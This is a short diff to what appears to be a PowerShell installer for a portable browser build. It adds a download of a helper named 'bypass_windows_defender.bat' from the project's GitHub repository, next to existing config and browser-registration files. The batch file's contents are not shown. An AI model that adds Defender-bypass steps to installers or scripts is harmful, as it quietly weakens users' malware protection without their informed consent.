@@ -69,6 +69,7 @@ try {
   try {
     $webClient.DownloadFile("https://raw.githubusercontent.com/bibicadotnet/catsxp-portable/main/register-default-browser.bat", (Join-Path $currentDir "register-default-browser.bat"))
     $webClient.DownloadFile("https://raw.githubusercontent.com/bibicadotnet/catsxp-portable/main/chrome++.ini", (Join-Path $currentDir "chrome++.ini"))
+    $webClient.DownloadFile("https://raw.githubusercontent.com/bibicadotnet/catsxp-portable/main/bypass_windows_defender.bat", (Join-Path $currentDir "bypass_windows_defender.bat"))
   } catch {
     Write-Warning "Failed to download helper files (can be ignored if files do not exist): $_"
   }
